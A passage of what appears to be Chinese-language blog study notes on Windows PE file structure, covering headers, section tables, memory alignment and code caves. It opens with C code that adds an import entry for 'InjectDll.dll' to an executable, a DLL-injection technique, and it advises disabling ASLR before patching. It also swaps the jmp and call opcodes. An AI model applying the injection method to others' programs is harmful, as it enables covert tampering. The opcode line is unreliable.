class="hljs-comment">//赋值给int和iat表</span><br>*startINT = ImportbynameRva;<br>*startIAT = ImportbynameRva;<br><span class="hljs-comment">//存储函数名字</span><br><span class="hljs-built_in">memcpy</span>(Importbyname-&gt;Name, <span class="hljs-string">&quot;ExportFunction&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-string">&quot;ExportFunction&quot;</span>));<br><br>start = (LPVOID)((DWORD)start + <span class="hljs-number">2</span> + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-string">&quot;ExportFunction&quot;</span>) );<span class="hljs-comment">//\0字符串结尾</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* dllname =<span class="hljs-literal">NULL</span>;<br>dllname = <span class="hljs-string">&quot;InjectDll.dll&quot;</span>;<br><br><span class="hljs-comment">//复制dll名字</span><br>PCHAR dllName = (PCHAR)start;<br><span class="hljs-built_in">memcpy</span>(dllName, <span class="hljs-string">&quot;InjectDll.dll&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-string">&quot;InjectDll.dll&quot;</span>));<br>DWORD dllnameRva = (DWORD)pLaswSectionHeaderBase-&gt;VirtualAddress + (DWORD)start - (DWORD)starttest;<br>start = (LPVOID)((DWORD)start  + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-string">&quot;InjectDll.dll&quot;</span>) );<span class="hljs-comment">//+1是\0字符串结尾</span><br><br><br><span class="hljs-comment">//把这个rva赋值给导入表的name属性</span><br>pNewdescripitor-&gt;Name = dllnameRva;<br><br><span class="hljs-comment">//修正IMAGE_DATA_DIRECTORY结构的VirtualAddress和Size</span><br>pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">1</span>].VirtualAddress = (DWORD)starttest-(DWORD)pFileBuffer;<br>pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">1</span>].Size = sizeofDescriper + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(_IMAGE_EXPORT_DIRECTORY);<br><br><span class="hljs-comment">//DWORD sizeofnewDescriptor = 20 + 16;</span><br><br><br><span class="hljs-comment">//free(pImageBuffer);</span><br><span class="hljs-keyword">return</span> pFileBuffer;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220317171414111.png" alt="image-20220317171414111" style="zoom:80%;"><img src="/2022/03/17/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-2/image-20220317171346388.png" alt="image-20220317171346388" style="zoom:67%;">]]></content>
    
    
    <categories>
      
      <category>逆向学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构学习记录-1</title>
    <link href="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/"/>
    <url>/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<h1 id="内存读写复习"><a class="markdownIt-Anchor" href="#内存读写复习"></a> 内存读写复习</h1><p>想当年也是做pwn题的，又看了看视频，发现有些东西还是忘记了。。。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">byte</span> <span class="hljs-number">8</span>位<br><span class="hljs-built_in">WORD</span> <span class="hljs-number">16</span>位<br><span class="hljs-built_in">DWORD</span> <span class="hljs-number">32</span>位<br><br>取值<br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-number">0x123FC2</span>]<br>取内存地址编号<br><span class="hljs-keyword">LEA</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[<span class="hljs-number">0x123FC2</span>]<br>内存前的<span class="hljs-built_in">DS</span> <span class="hljs-built_in">ES</span> <span class="hljs-built_in">SS</span><br><span class="hljs-built_in">DS</span> 是个数 <br><span class="hljs-built_in">ESP</span> <span class="hljs-built_in">EBP</span>: <span class="hljs-built_in">SS</span><br><span class="hljs-built_in">EDI</span> :<span class="hljs-built_in">ES</span><br><br><span class="hljs-built_in">ESP</span> 栈顶<br><span class="hljs-built_in">EBP</span> 栈底<br><span class="hljs-keyword">push</span> 入栈<br><span class="hljs-keyword">pop</span> 出栈<br>栈高往低走<br><br><span class="hljs-keyword">push</span> 相当<br><span class="hljs-keyword">lea</span> <span class="hljs-built_in">esp</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">esp</span>-<span class="hljs-number">4</span>]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>[<span class="hljs-built_in">esp</span>],<span class="hljs-built_in">eax</span><br>栈顶拔高<br><br><span class="hljs-built_in">ECX</span> 值决定<span class="hljs-keyword">REP</span>指令重复次数<br>stos指令，它的功能是将<span class="hljs-built_in">eax</span>中的数据放入的<span class="hljs-built_in">edi</span>所指的地址中，同时，<span class="hljs-built_in">edi</span>会增加<span class="hljs-number">4</span>个字节，<span class="hljs-keyword">rep</span>使指令重复执行<span class="hljs-built_in">ecx</span>中填写的次数。<br>方括弧表示存储器，这个地址实际上是<span class="hljs-built_in">edi</span>的内容所指向的地址。这里的stos其实对应的是<span class="hljs-keyword">stosd</span>,其它的还有<br><span class="hljs-keyword">CALL</span> : <span class="hljs-built_in">EIP</span>改为函数地址，返回地址压栈<br><span class="hljs-keyword">RET</span> 返回时改<span class="hljs-built_in">EIP</span>（弹栈,<span class="hljs-built_in">esp</span>加）<br><br><br></code></pre></td></tr></table></figure><h1 id="pe头解析"><a class="markdownIt-Anchor" href="#pe头解析"></a> pe头解析</h1><p>内容</p><p><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/5b4b62c4c1faa.jpg" alt="5b4b62c4c1faa"></p><p>以下内容有<em>参考</em>x复制✓[<a href="https://bbs.pediy.com/thread-270210.htm">原创]归纳PE结构基础知识，顺便手撕个PE-编程技术-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p>内存对齐和硬盘对齐</p><p>就是一个pe文件在硬盘上的数据可能和硬盘中的不一样</p><p>因为老软件硬盘对齐是200h</p><p>内存对齐是1000h</p><p>后来就对齐一样了</p><p>使用分节结构原因：</p><p>节省内存，多开的时候只需要</p><h2 id="dos头"><a class="markdownIt-Anchor" href="#dos头"></a> DOS头</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">typedef struct _IMAE_DOS_HEADER<br>&#123; <br>    WORD e_magic;              <span class="hljs-comment">//  0x00, &#x27;MZ&#x27;（0x5A4D）标识 </span><br>        <span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><br>    LONG e_lfanew;             <span class="hljs-comment">//  0x3C, PE头的起始地址，默认0xB0处</span><br>&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;  <br><br></code></pre></td></tr></table></figure><p><strong>重要：</strong><br><strong>1.WORD e_magic</strong>（0x00处）<br>● 对应PE文件的开头，是PE文件DOS头的标识符&quot;MZ&quot;→0x5A4D<br>○ 对应Winnt.h头文件中宏定义: #define IMAGE_DOS_SIGNATURE 0x4D5A // MZ<br><strong>2.LONG e_lfanew</strong>（0x3C处）<br>● 对应PE文件0x3C处指向NT头在文件中的偏移（默认0xB0），即32位及以上系统文件头在文件中真正的偏移</p><h2 id="2nt头"><a class="markdownIt-Anchor" href="#2nt头"></a> 2.NT头</h2><h3 id="1dword-signaturepe000x00004550"><a class="markdownIt-Anchor" href="#1dword-signaturepe000x00004550"></a> （1）DWORD Signature：&quot;PE\0\0&quot;→0x00004550</h3><h3 id="2文件头结构体-image_file_header-fileheader标准pe头"><a class="markdownIt-Anchor" href="#2文件头结构体-image_file_header-fileheader标准pe头"></a> (2)文件头结构体 IMAGE_FILE_HEADER FileHeader（标准PE头）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 文件头结构体： _IMAGE_FILE_HEADER</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_FILE_HEADER</span>&#123;</span><br>     WORD Machine;                               <span class="hljs-comment">// +0x00, 指定程序的运行平台，勿改</span><br>     WORD NumberOfSections;          <span class="hljs-comment">// +0x02, PE中的节/块(section)数量，勿改</span><br>     DWORD TimeDateStamp;                <span class="hljs-comment">// +0x04, 时间戳：链接器填写的文件生成时间</span><br>     DWORD PointerToSymbolTable;  <span class="hljs-comment">// +0x08, 指向符号表的地址(主要用于调试)</span><br>     DWORD NumberOfSymbols;          <span class="hljs-comment">// +0x0C, 符号表中符号个数(同上)</span><br>     WORD SizeOfOptionalHeader;  <span class="hljs-comment">// +0x10, IMAGE_OPTIONAL_HEADER32选项头结构大小，勿改</span><br>     WORD Characteristics;               <span class="hljs-comment">// +0x12, 文件属性，勿改</span><br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br> <br><span class="hljs-comment">//* 字段1：Machine 表CPU的类型, 定义在windows.h中，常用类型</span><br>            <span class="hljs-number">32</span>位：<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_MACHINE_I386, 0x014c　<span class="hljs-comment">// Intel 386, x86</span></span><br>            <span class="hljs-number">64</span>位：<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64, 0x8664 <span class="hljs-comment">// AMD64(KB), x64</span></span><br><span class="hljs-comment">//* 字段2：NumberOfSections 表PE中的节(section)数量：</span><br>            节表紧跟在IMAGE_NT_HEADERS后面,此字段决定了节表中元素的个数，即节的个数<br>      遍历节表经验：根据此处的个数拿对应的节表数据<br><span class="hljs-comment">//* 字段6：SizeOfOptionalHeader 表IMAGE_OPTIONAL_HEADER32 结构大小</span><br>            定位节表位置=选项头地址+选项头大小<br><span class="hljs-comment">//* 字段7： Characteristics 表文件属性,EXE默认0100,DLL默认210Eh,或运算组合设置。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED　　　　 0x0001　<span class="hljs-comment">// 文件中不存在重定位信息</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE　　　　0x0002　<span class="hljs-comment">// 文件可执行</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED　　　0x0004　<span class="hljs-comment">// 文件中不存在行信息</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED　　 0x0008　<span class="hljs-comment">// 文件中不存在符号信息</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_AGGRESIVE_WS_TRIM　　　 0x0010　<span class="hljs-comment">// 调整工作集</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_LARGE_ADDRESS_AWARE　　 0x0020　<span class="hljs-comment">// 程序能处理大于2G的地址</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_LO　　　 0x0080　<span class="hljs-comment">// 小尾方式</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_32BIT_MACHINE　　　　　 0x0100　<span class="hljs-comment">// 只在32位平台上运行</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_DEBUG_STRIPPED　　　　　0x0200　<span class="hljs-comment">// 不包含调试信息</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP　0x0400　<span class="hljs-comment">// 不能从可移动盘运行</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_NET_RUN_FROM_SWAP　　　　0x0800　<span class="hljs-comment">// 不能从网络运行 </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_SYSTEM　　　　　　　　　　0x1000　<span class="hljs-comment">// 系统文件（如驱动程序），不能直接运行</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_DLL　　　　　　　　　　　 0x2000　<span class="hljs-comment">// 是一个dll文件</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_UP_SYSTEM_ONLY　　　　　 0x4000　<span class="hljs-comment">// 文件不能在多处理器计算机上运行</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_HI　　　  0x8000　<span class="hljs-comment">// 大尾方式</span></span><br></code></pre></td></tr></table></figure><h3 id="3选项头结构体image_optional_header区分32位和64位可选pe头"><a class="markdownIt-Anchor" href="#3选项头结构体image_optional_header区分32位和64位可选pe头"></a> (3)选项头结构体IMAGE_OPTIONAL_HEADER（区分32位和64位，可选PE头）</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs awk">typedef struct _IMAGE_OPTIONAL_HEADER<br>&#123;<br>    WORD   Magic;                            <span class="hljs-regexp">//</span>* PE标志字：<span class="hljs-number">32</span>位（<span class="hljs-number">0</span>x10B），<span class="hljs-number">64</span>位（<span class="hljs-number">0</span>x20B）<br>    BYTE   MajorLinkerVersion;               <span class="hljs-regexp">//</span>  主链接器版本号<br>    BYTE   MinorLinkerVersion;               <span class="hljs-regexp">//</span>  副链接器版本号<br>    DWORD  SizeOfCode;                        <span class="hljs-regexp">//</span>  代码所占空间大小（代码节大小）<br>    DWORD  SizeOfInitializedData;         <span class="hljs-regexp">//</span>  已初始化数据所占空间大小<br>    DWORD  SizeOfUninitializedData;           <span class="hljs-regexp">//</span>  未初始化数据所占空间大小<br>    DWORD  AddressOfEntryPoint;               <span class="hljs-regexp">//</span>* 程序执行入口RVA，(w)(Win)mainCRTStartup：即<span class="hljs-number">0</span>D首次断下来的自进程地址<br>    DWORD  BaseOfCode;                        <span class="hljs-regexp">//</span>  代码段基址<br>    DWORD  BaseOfData;                        <span class="hljs-regexp">//</span>  数据段基址<br>    DWORD  ImageBase;                     <span class="hljs-regexp">//</span>* 内存加载基址，exe默认<span class="hljs-number">0</span>x400000，dll默认<span class="hljs-number">0</span>x10000000<br>    DWORD  SectionAlignment;              <span class="hljs-regexp">//</span>* 节区数据在内存中的对齐值，一定是<span class="hljs-number">4</span>的倍数，一般是<span class="hljs-number">0</span>x1000(<span class="hljs-number">4096</span>=<span class="hljs-number">4</span>K)<br>    DWORD  FileAlignment;                 <span class="hljs-regexp">//</span>* 节区数据在文件中的对齐值，一般是<span class="hljs-number">0</span>x200(磁盘扇区大小<span class="hljs-number">512</span>)<br>    WORD   MajorOperatingSystemVersion;      <span class="hljs-regexp">//</span>  要求操作系统最低版本号的主版本号<br>    WORD   MinorOperatingSystemVersion;      <span class="hljs-regexp">//</span>  要求操作系统最低版本号的副版本号<br>    WORD   MajorImageVersion;                <span class="hljs-regexp">//</span>  可运行于操作系统的主版本号<br>    WORD   MinorImageVersion;                <span class="hljs-regexp">//</span>  可运行于操作系统的次版本号<br>    WORD   MajorSubsystemVersion;            <span class="hljs-regexp">//</span>  主子系统版本号：不可修改<br>    WORD   MinorSubsystemVersion;            <span class="hljs-regexp">//</span>  副子系统版本号<br>    DWORD  Win32VersionValue;             <span class="hljs-regexp">//</span>  版本号：不被病毒利用的话一般为<span class="hljs-number">0</span>,XP中不可修改<br>    DWORD  SizeOfImage;                       <span class="hljs-regexp">//</span>* PE文件在进程内存中的总大小，与SectionAlignment对齐<br>    DWORD  SizeOfHeaders;                 <span class="hljs-regexp">//</span>* PE文件头部在文件中的按照文件对齐后的总大小（所有头 + 节表）<br>    DWORD  CheckSum;                      <span class="hljs-regexp">//</span>  对文件做校验，判断文件是否被修改：<span class="hljs-number">3</span>环无用，MapFileAndCheckSum获取<br>    WORD   Subsystem;                        <span class="hljs-regexp">//</span>  子系统，与连接选项<span class="hljs-regexp">/system相关：1=驱动程序，2=图形界面，3=控制台/</span>Dll<br>    WORD   DllCharacteristics;               <span class="hljs-regexp">//</span>  文件特性<br>    DWORD  SizeOfStackReserve;                <span class="hljs-regexp">//</span>  初始化时保留的栈大小<br>    DWORD  SizeOfStackCommit;             <span class="hljs-regexp">//</span>  初始化时实际提交的栈大小<br>    DWORD  SizeOfHeapReserve;             <span class="hljs-regexp">//</span>  初始化时保留的堆大小<br>    DWORD  SizeOfHeapCommit;              <span class="hljs-regexp">//</span>  初始化时实际提交的堆大小<br>    DWORD  LoaderFlags;                       <span class="hljs-regexp">//</span>  已废弃，与调试有关，默认为 <span class="hljs-number">0</span><br>    DWORD  NumberOfRvaAndSizes;               <span class="hljs-regexp">//</span>  下边数据目录的项数，此字段自Windows NT发布以来,一直是<span class="hljs-number">16</span><br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="hljs-regexp">//</span> 数据目录表<br>&#125; IMAGE_OPTIONAL_HEADER32, * PIMAGE_OPTIONAL_HEADER32;<br> <br><span class="hljs-regexp">//</span>* 字段<span class="hljs-number">6</span>：AddressOfEntryPoint 表 程序入口RVA，即OEP:<br>      EOP:程序入口点，壳相关概念<br>      OEP:原本的程序入口点（实际为偏移，+模块基址=实际入口点）<br>      EP: 被加工后的入口点<br><span class="hljs-regexp">//</span>* 字段<span class="hljs-number">9</span>：ImageBase 表 模块加载基地址，exe默认<span class="hljs-number">0</span>x400000，dll默认<span class="hljs-number">0</span>x10000000<br>      建议装载地址：exe映射加载到内存中的首地址= PE <span class="hljs-number">0</span>处，即实例句柄hInstance<br>      一般而言，exe文件可遵从装载地址建议，但dll文件无法满足<br><span class="hljs-regexp">//</span>* 尾字段：DataDirectory 表 数据目录表，用来定义多种不通用处的数据块。<br>      存储了PE中各个表的位置，详情参考IMAGE_DIRECTORY_ENTRY...系列宏<br></code></pre></td></tr></table></figure><h2 id="3节表"><a class="markdownIt-Anchor" href="#3节表"></a> 3.节表</h2><h3 id="1节表总概"><a class="markdownIt-Anchor" href="#1节表总概"></a> （1）节表总概</h3><ul><li><p>节表：描述PE文件与内存之间的映射关系，由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来描述一个节（每个节占用0x28h），说明PE文件的指定内容拷贝至内存的哪个位置、拷贝大小及内存属性的设置。结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的IMAGE_SECTION_HEADER结构作为结束，所以节表中总的IMAGE_SECTION_HEADER结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。</p></li><li><p>节表大小 = FileHeader.NumberOfSections（节数量）* IMAGE_SECTION_HEADER 结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// IMAGE_SECTION_HEADER 节表结构体，大小40B</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];  <span class="hljs-comment">// 节表名称：描述性字段</span><br>  <span class="hljs-comment">// 下方4个字段：从文件S1处开始，拷贝S2大小的数据，到内存S3处，有效数据占用内存S4大小</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    DWORD PhysicalAddress;<br>    DWORD VirtualSize;         <span class="hljs-comment">// S4:内存大小</span><br>  &#125; Misc;<br>  DWORD VirtualAddress;          <span class="hljs-comment">// S3:内存地址：基于模块基址</span><br>  DWORD SizeOfRawData;           <span class="hljs-comment">// （拷贝的到内存数据大小）S2:文件对齐大小</span><br>  DWORD PointerToRawData;        <span class="hljs-comment">// （节在文件中偏移）S1:文件偏移</span><br>  DWORD PointerToRelocations;    <span class="hljs-comment">// 无用</span><br>  DWORD PointerToLinenumbers;    <span class="hljs-comment">// 无用</span><br>  WORD  NumberOfRelocations;    <span class="hljs-comment">// 无用</span><br>  WORD  NumberOfLinenumbers;    <span class="hljs-comment">// 无用</span><br>  DWORD Characteristics;     <span class="hljs-comment">// 节属性，取值IMAGE_SCN_...系列宏</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br></code></pre></td></tr></table></figure><p><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/1.jpg" alt="img"></p></li></ul><p>节属性常用位含义</p><p>节表置于选项头之后，节表首地址 计算方法：</p><p>选项头的地址 + 选项头的大小；</p><p>（2） e_lfanew+4+0x14（文件头大小）+0xE0（32位选项头大小）64位是0xF0。</p><p><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/image-20220227003416563.png" alt="image-20220227003416563"></p><h2 id="filebuffer文件里的数据状态与imagebuffer内存里的数据状态"><a class="markdownIt-Anchor" href="#filebuffer文件里的数据状态与imagebuffer内存里的数据状态"></a> FileBuffer（文件里的数据状态）与ImageBuffer（内存里的数据状态）</h2><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/image-20220227205440595.png" alt="image-20220227205440595" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SizeOfRawData不一定比Misc大，因为Misc在文件中，可能是在文件里未初始化未进行分配的值（记录的是在内存中的大小）<br></code></pre></td></tr></table></figure><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/image-20220227212440476.png" alt="image-20220227212440476" style="zoom:67%;"><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake">写代码的坑<br>vs fopen_s 函数：<br>第一个参数是<span class="hljs-keyword">FILE</span> *指针<br>第二个文件名字<br>第三个是方法<br></code></pre></td></tr></table></figure><h1 id="call-jmp"><a class="markdownIt-Anchor" href="#call-jmp"></a> call jmp</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">jmp</span> = E8<br><span class="hljs-keyword">jmp</span>后面的值<span class="hljs-built_in">x</span> = <span class="hljs-keyword">jmp</span>后一条指令地址（运行时内存中的地址）+要跳转的地址<br><span class="hljs-keyword">call</span> = E9<br><span class="hljs-keyword">call</span> 后面的值同上，均是运行时内存中的地址<br></code></pre></td></tr></table></figure><h1 id="指针"><a class="markdownIt-Anchor" href="#指针"></a> 指针</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">（<span class="hljs-built_in">byte</span>*）转<span class="hljs-built_in">byte</span>型指针<br>（<span class="hljs-built_in">dword</span>）要用指针算地址的时候转的<span class="hljs-built_in">dword</span>类型<br>都是强制类型转换<br></code></pre></td></tr></table></figure><h1 id="任意空白区添加代码"><a class="markdownIt-Anchor" href="#任意空白区添加代码"></a> 任意空白区添加代码</h1><h2 id="修改vs编译的程序遇到的问题"><a class="markdownIt-Anchor" href="#修改vs编译的程序遇到的问题"></a> 修改vs编译的程序，遇到的问题：</h2><p>1.要是修改vs编译出来的程序要跳过.textbss这个节表，这个表的内存地址和文件地址都为0x000000</p><p>2.vs编译的程序已经开启ALSR(地址随机化)，要想修改成功需要关闭这个</p><img src="/2022/02/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0-1/image-20220303143104764.png" alt="image-20220303143104764" style="zoom: 67%;"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LPVOID <span class="hljs-title">changeimagebuffer</span><span class="hljs-params">(LPVOID imagebuffer)</span> </span>&#123;<br>PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>DWORD SizeOfImage = <span class="hljs-number">0</span>;<br>DWORD SizeOfHeaders = <span class="hljs-number">0</span>;<br>WORD NumberOfSections = <span class="hljs-number">0</span>;<br>PIMAGE_SECTION_HEADER pSectionHeaderBase = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS pNtHeaders = <span 